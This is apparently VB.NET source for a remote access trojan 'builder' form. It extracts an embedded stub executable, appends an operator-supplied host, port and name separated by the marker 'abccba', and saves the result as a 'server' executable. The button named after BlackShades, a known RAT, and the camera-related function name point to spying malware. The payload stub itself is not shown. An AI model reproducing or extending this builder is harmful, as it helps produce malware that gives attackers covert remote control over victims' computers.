Imports System.IO

Public Class smallbuild
    Dim stub, text1, text2, text3 As String
    Const spl As String = "abccba" ' same in server if you wanna to change it  , we have to change it in server 
    Dim ex As Exception
    Sub start_withoutcam()
        If TextBox1.Text & TextBox2.Text & TextBox3.Text = "" Then
            MsgBox("Complete Information Please At least Host & Port & Name ", MsgBoxStyle.Critical, "Create Server")
        Else
            Dim s As New SaveFileDialog
            s.ShowDialog()
            If s.FileName > "" Then
                text1 = TextBox1.Text
                text2 = TextBox2.Text
                text3 = TextBox3.Text
                Dim temp As String = IO.Path.GetTempPath() & "Small.exe"
                'FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                File.WriteAllBytes(temp, My.Resources.small)

                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                stub = Space(LOF(1))
                FileGet(1, stub)
                FileClose(1)
                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, stub & spl & text1 & spl & text2 & spl & text3)
                FileClose(1)
                ListBox1.Items.Clear()
                ListBox1.Items.Add("Host : " & text1)
                ListBox1.Items.Add("Port : " & text2)
                ListBox1.Items.Add("Name : " & text3)

                ListBox1.Items.Add("Server Build In : " & s.FileName)
            Else
                ListBox1.Items.Add(ex)
            End If
        End If
    End Sub
    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        start_withoutcam()
    End Sub
End Class